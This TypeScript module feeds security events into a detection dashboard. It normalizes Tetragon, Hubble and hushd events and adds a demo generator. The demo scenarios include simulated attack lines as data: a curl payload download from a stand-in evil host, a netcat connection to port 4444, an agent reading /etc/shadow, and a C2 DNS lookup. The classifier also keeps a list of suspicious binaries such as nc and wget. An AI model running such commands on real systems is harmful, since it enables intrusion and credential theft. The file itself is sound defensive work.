/**
 * SpineEventSource - Unified event source for spine/NATS events
 *
 * Supports two modes:
 * 1. **Live mode** - Receives events from the Tauri backend via `spine_events` Tauri event
 *    channel (the Rust side connects to NATS and relays events)
 * 2. **Demo mode** - Generates realistic simulated events when no spine connection is available
 *
 * Both modes emit normalized SDREvent objects through the same callback interface.
 */

import type {
  SDREvent,
  SDREventCategory,
  SDREventSource,
  SDRSeverity,
  SDRMitreMapping,
  SDRNetworkInfo,
  SDREventOrigin,
  SpineConnectionStatus,
} from "@/types/spine";
import { isTauri } from "./tauri";

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

export type SpineEventCallback = (event: SDREvent) => void;
export type SpineStatusCallback = (status: SpineConnectionStatus) => void;

export interface SpineEventSourceOptions {
  onEvent: SpineEventCallback;
  onStatus?: SpineStatusCallback;
  /** NATS URL to connect to (only used in live mode) */
  natsUrl?: string;
  /** Force demo mode even if Tauri is available */
  forceDemo?: boolean;
  /** Demo event interval in ms (default 2000) */
  demoInterval?: number;
}

export class SpineEventSource {
  private options: SpineEventSourceOptions;
  private status: SpineConnectionStatus = "disconnected";
  private demoTimer: number | null = null;
  private demoCounter = 0;
  private tauriUnlisten: (() => void) | null = null;

  constructor(options: SpineEventSourceOptions) {
    this.options = options;
  }

  async connect(): Promise<void> {
    if (this.status === "connected" || this.status === "demo") {
      return;
    }

    // Try live mode first
    if (!this.options.forceDemo && isTauri() && this.options.natsUrl) {
      try {
        this.setStatus("connecting");
        await this.connectLive();
        return;
      } catch {
        // Fall through to demo mode
      }
    }

    // Demo mode
    this.startDemo();
  }

  disconnect(): void {
    this.stopDemo();
    this.disconnectLive();
    this.setStatus("disconnected");
  }

  getStatus(): SpineConnectionStatus {
    return this.status;
  }

  // ---------------------------------------------------------------------------
  // Live mode (Tauri + NATS)
  // ---------------------------------------------------------------------------

  private async connectLive(): Promise<void> {
    const { invoke } = await import("@tauri-apps/api/core");
    const { listen } = await import("@tauri-apps/api/event");

    // Subscribe to Tauri event channel
    this.tauriUnlisten = await listen<Record<string, unknown>>("spine_event", (event) => {
      const sdrEvent = normalizeSpinePayload(event.payload);
      if (sdrEvent) {
        this.options.onEvent(sdrEvent);
      }
    });

    // Tell the Rust backend to start subscribing to NATS
    await invoke("subscribe_spine_events", { natsUrl: this.options.natsUrl });
    this.setStatus("connected");
  }

  private disconnectLive(): void {
    if (this.tauriUnlisten) {
      this.tauriUnlisten();
      this.tauriUnlisten = null;
    }

    // Best-effort: tell Rust to stop subscribing
    if (isTauri()) {
      import("@tauri-apps/api/core").then(({ invoke }) => {
        invoke("unsubscribe_spine_events").catch(() => {});
      }).catch(() => {});
    }
  }

  // ---------------------------------------------------------------------------
  // Demo mode (simulated events)
  // ---------------------------------------------------------------------------

  private startDemo(): void {
    this.setStatus("demo");
    const interval = this.options.demoInterval ?? 2000;

    // Emit an initial burst of events
    for (let i = 0; i < 5; i++) {
      setTimeout(() => {
        this.options.onEvent(generateDemoEvent(this.demoCounter++));
      }, i * 200);
    }

    this.demoTimer = window.setInterval(() => {
      this.options.onEvent(generateDemoEvent(this.demoCounter++));
    }, interval);
  }

  private stopDemo(): void {
    if (this.demoTimer !== null) {
      clearInterval(this.demoTimer);
      this.demoTimer = null;
    }
  }

  private setStatus(status: SpineConnectionStatus): void {
    this.status = status;
    this.options.onStatus?.(status);
  }
}

// ---------------------------------------------------------------------------
// Normalization: raw spine/NATS payload -> SDREvent
// ---------------------------------------------------------------------------

function normalizeSpinePayload(payload: Record<string, unknown>): SDREvent | null {
  try {
    // Tetragon-style event
    if (payload.process_exec || payload.process_kprobe || payload.process_exit) {
      return normalizeTetragonEvent(payload);
    }

    // Hubble-style flow event
    if (payload.source && payload.destination && payload.verdict) {
      return normalizeHubbleEvent(payload);
    }

    // Hushd-style event
    if (payload.type && payload.data) {
      return normalizeHushdEvent(payload);
    }

    // Generic: wrap as-is
    return {
      id: String(payload.id ?? crypto.randomUUID()),
      timestamp: String(payload.timestamp ?? new Date().toISOString()),
      source: "hushd",
      category: "policy_violation",
      severity: 0.5,
      severityLabel: "medium",
      summary: String(payload.message ?? payload.summary ?? "Unknown event"),
      raw: payload,
    };
  } catch {
    return null;
  }
}

function normalizeTetragonEvent(payload: Record<string, unknown>): SDREvent {
  const exec = (payload.process_exec ?? payload.process_kprobe ?? payload.process_exit) as Record<string, unknown> | undefined;
  const process = (exec?.process ?? payload.process) as Record<string, unknown> | undefined;

  const binary = String(process?.binary ?? "unknown");
  const args = Array.isArray(process?.arguments) ? (process.arguments as string[]) : undefined;
  const execId = String(process?.exec_id ?? "");
  const parentExecId = String((process?.parent as Record<string, unknown>)?.exec_id ?? "");
  const podField = process?.pod;
  const pod = String(
    (podField && typeof podField === "object" ? (podField as Record<string, unknown>).name : podField) ?? "",
  );
  const namespace = String(process?.namespace ?? "");

  let category: SDREventCategory = "process_exec";
  if (payload.process_exit) category = "process_exit";
  if (payload.process_kprobe) {
    const funcName = String((payload.process_kprobe as Record<string, unknown>)?.function_name ?? "");
    if (funcName.includes("write") || funcName.includes("open")) category = "file_write";
    if (funcName.includes("connect") || funcName.includes("sendmsg")) category = "network_connect";
  }

  const { severity, severityLabel } = classifyTetragonSeverity(binary, category);
  const mitre = mapTetragonToMitre(category, binary);

  return {
    id: crypto.randomUUID(),
    timestamp: String(payload.time ?? new Date().toISOString()),
    source: "tetragon",
    category,
    severity,
    severityLabel,
    summary: `${category.replace(/_/g, " ")}: ${binary}${pod ? ` (${pod})` : ""}`,
    origin: { execId, parentExecId, binary, args, pod, namespace },
    mitre: mitre ?? undefined,
    raw: payload,
  };
}

function normalizeHubbleEvent(payload: Record<string, unknown>): SDREvent {
  const src = payload.source as Record<string, unknown>;
  const dst = payload.destination as Record<string, unknown>;
  const verdict = String(payload.verdict ?? "forwarded");

  const network: SDRNetworkInfo = {
    srcIp: String(src?.ip ?? ""),
    dstIp: String(dst?.ip ?? ""),
    srcPort: Number(src?.port ?? 0),
    dstPort: Number(dst?.port ?? 0),
    protocol: String(payload.protocol ?? "tcp"),
    bytes: Number(payload.bytes ?? 0),
    direction: payload.is_reply ? "ingress" : "egress",
    verdict: verdict as SDRNetworkInfo["verdict"],
  };

  const severity = verdict === "dropped" ? 0.7 : verdict === "error" ? 0.8 : 0.2;
  const severityLabel = scoreSeverity(severity);

  return {
    id: crypto.randomUUID(),
    timestamp: String(payload.time ?? new Date().toISOString()),
    source: "hubble",
    category: "network_flow",
    severity,
    severityLabel,
    summary: `${network.srcIp}:${network.srcPort} -> ${network.dstIp}:${network.dstPort} [${verdict}]`,
    network,
    origin: {
      pod: String(src?.pod_name ?? ""),
      namespace: String(src?.namespace ?? ""),
    },
    raw: payload,
  };
}

function normalizeHushdEvent(payload: Record<string, unknown>): SDREvent {
  const data = payload.data as Record<string, unknown>;
  const allowed = data?.allowed !== false;

  return {
    id: String(data?.event_id ?? crypto.randomUUID()),
    timestamp: String(payload.timestamp ?? new Date().toISOString()),
    source: "hushd",
    category: allowed ? "file_access" : "policy_violation",
    severity: allowed ? 0.2 : 0.8,
    severityLabel: allowed ? "low" : "high",
    summary: String(data?.message ?? `${payload.type}: ${data?.target ?? "unknown"}`),
    raw: payload,
  };
}

// ---------------------------------------------------------------------------
// Classification helpers
// ---------------------------------------------------------------------------

function classifyTetragonSeverity(binary: string, category: SDREventCategory): { severity: number; severityLabel: SDRSeverity } {
  const suspiciousBinaries = ["curl", "wget", "nc", "ncat", "python", "perl", "ruby", "bash", "sh", "powershell", "cmd"];
  const isSuspicious = suspiciousBinaries.some((b) => binary.includes(b));

  let severity = 0.3;
  if (category === "network_connect") severity = 0.5;
  if (category === "file_write") severity = 0.4;
  if (category === "privilege_escalation") severity = 0.9;
  if (isSuspicious) severity = Math.min(severity + 0.3, 1);

  return { severity, severityLabel: scoreSeverity(severity) };
}

function scoreSeverity(score: number): SDRSeverity {
  if (score >= 0.8) return "critical";
  if (score >= 0.6) return "high";
  if (score >= 0.4) return "medium";
  if (score >= 0.2) return "low";
  return "info";
}

function mapTetragonToMitre(category: SDREventCategory, binary: string): SDRMitreMapping | null {
  if (category === "process_exec") {
    if (binary.includes("sh") || binary.includes("bash") || binary.includes("cmd")) {
      return { techniqueId: "T1059", techniqueName: "Command and Scripting Interpreter", tactic: "execution" };
    }
    if (binary.includes("python") || binary.includes("perl") || binary.includes("ruby")) {
      return { techniqueId: "T1059.006", techniqueName: "Python", tactic: "execution" };
    }
  }
  if (category === "file_write") {
    return { techniqueId: "T1565", techniqueName: "Data Manipulation", tactic: "impact" };
  }
  if (category === "network_connect") {
    return { techniqueId: "T1071", techniqueName: "Application Layer Protocol", tactic: "command-and-control" };
  }
  if (category === "privilege_escalation") {
    return { techniqueId: "T1548", techniqueName: "Abuse Elevation Control Mechanism", tactic: "privilege-escalation" };
  }
  return null;
}

// ---------------------------------------------------------------------------
// Demo event generator
// ---------------------------------------------------------------------------

const DEMO_SCENARIOS: Array<() => Partial<SDREvent>> = [
  // Tetragon process exec
  () => ({
    source: "tetragon" as SDREventSource,
    category: "process_exec" as SDREventCategory,
    severity: 0.85,
    severityLabel: "critical" as SDRSeverity,
    summary: "process_exec: /usr/bin/curl -o /tmp/payload.sh https://evil.example.com/shell",
    origin: { binary: "/usr/bin/curl", args: ["-o", "/tmp/payload.sh", "https://evil.example.com/shell"], pod: "web-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
    mitre: { techniqueId: "T1105", techniqueName: "Ingress Tool Transfer", tactic: "command-and-control" },
  }),
  // Tetragon file write
  () => ({
    source: "tetragon" as SDREventSource,
    category: "file_write" as SDREventCategory,
    severity: 0.7,
    severityLabel: "high" as SDRSeverity,
    summary: "file_write: /etc/crontab modified by unknown process",
    origin: { binary: "/usr/bin/crontab", pod: "api-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
    mitre: { techniqueId: "T1053.003", techniqueName: "Cron", tactic: "persistence" },
  }),
  // Tetragon network connect
  () => ({
    source: "tetragon" as SDREventSource,
    category: "network_connect" as SDREventCategory,
    severity: 0.6,
    severityLabel: "high" as SDRSeverity,
    summary: "network_connect: outbound connection to 198.51.100.42:4444",
    origin: { binary: "/usr/bin/nc", pod: "auth-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
    network: { dstIp: "198.51.100.42", dstPort: 4444, protocol: "tcp", direction: "egress" as const },
    mitre: { techniqueId: "T1071.001", techniqueName: "Web Protocols", tactic: "command-and-control" },
  }),
  // Hubble dropped flow
  () => ({
    source: "hubble" as SDREventSource,
    category: "network_flow" as SDREventCategory,
    severity: 0.7,
    severityLabel: "high" as SDRSeverity,
    summary: "10.1.1.20:48832 -> 198.51.100.42:443 [dropped]",
    network: { srcIp: "10.1.1.20", dstIp: "198.51.100.42", srcPort: 48832, dstPort: 443, protocol: "tcp", verdict: "dropped" as const, direction: "egress" as const, bytes: 0 },
    origin: { pod: "auth-prod-01", namespace: "production" },
  }),
  // Hubble normal flow
  () => ({
    source: "hubble" as SDREventSource,
    category: "network_flow" as SDREventCategory,
    severity: 0.1,
    severityLabel: "info" as SDRSeverity,
    summary: "10.1.1.10:35200 -> 10.1.2.10:5432 [forwarded]",
    network: { srcIp: "10.1.1.10", dstIp: "10.1.2.10", srcPort: 35200, dstPort: 5432, protocol: "tcp", verdict: "forwarded" as const, direction: "egress" as const, bytes: 4096 },
    origin: { pod: "web-prod-01", namespace: "production" },
  }),
  // Hushd policy violation
  () => ({
    source: "hushd" as SDREventSource,
    category: "policy_violation" as SDREventCategory,
    severity: 0.9,
    severityLabel: "critical" as SDRSeverity,
    summary: "Blocked: agent tried to read /etc/shadow (ForbiddenPathGuard)",
    origin: { binary: "claude-agent", pod: "agent-runner-01", namespace: "agents" },
  }),
  // Secret leak detection
  () => ({
    source: "hushd" as SDREventSource,
    category: "secret_leak" as SDREventCategory,
    severity: 0.95,
    severityLabel: "critical" as SDRSeverity,
    summary: "Secret detected in file write: AWS_SECRET_ACCESS_KEY pattern",
    origin: { binary: "agent-coder", pod: "agent-runner-02", namespace: "agents" },
    mitre: { techniqueId: "T1552.001", techniqueName: "Credentials In Files", tactic: "credential-access" },
  }),
  // DNS query
  () => ({
    source: "hubble" as SDREventSource,
    category: "dns_query" as SDREventCategory,
    severity: 0.4,
    severityLabel: "medium" as SDRSeverity,
    summary: "DNS query: c2.evil-domain.example from auth-prod-01",
    network: { dnsName: "c2.evil-domain.example", dstPort: 53, protocol: "udp", direction: "egress" as const },
    origin: { pod: "auth-prod-01", namespace: "production" },
  }),
  // Privilege escalation
  () => ({
    source: "tetragon" as SDREventSource,
    category: "privilege_escalation" as SDREventCategory,
    severity: 0.95,
    severityLabel: "critical" as SDRSeverity,
    summary: "privilege_escalation: setuid binary executed in container",
    origin: { binary: "/usr/bin/sudo", args: ["su", "-"], pod: "web-prod-01", namespace: "production", execId: `exec-${Date.now()}`, uid: 0 },
    mitre: { techniqueId: "T1548.003", techniqueName: "Sudo and Sudo Caching", tactic: "privilege-escalation" },
  }),
  // Normal process exec (low severity)
  () => ({
    source: "tetragon" as SDREventSource,
    category: "process_exec" as SDREventCategory,
    severity: 0.15,
    severityLabel: "info" as SDRSeverity,
    summary: "process_exec: /usr/bin/ls -la /app/data",
    origin: { binary: "/usr/bin/ls", args: ["-la", "/app/data"], pod: "api-prod-01", namespace: "production", execId: `exec-${Date.now()}` },
  }),
];

function generateDemoEvent(counter: number): SDREvent {
  const scenario = DEMO_SCENARIOS[counter % DEMO_SCENARIOS.length]();

  // Add jitter to timestamps and slight severity variation
  const jitter = Math.random() * 0.1 - 0.05;
  const severity = Math.max(0, Math.min(1, (scenario.severity ?? 0.5) + jitter));

  return {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    source: scenario.source ?? "tetragon",
    category: scenario.category ?? "process_exec",
    severity,
    severityLabel: scenario.severityLabel ?? scoreSeverity(severity),
    summary: scenario.summary ?? "Demo event",
    origin: scenario.origin,
    network: scenario.network,
    mitre: scenario.mitre,
    raw: { demo: true, counter },
  };
}
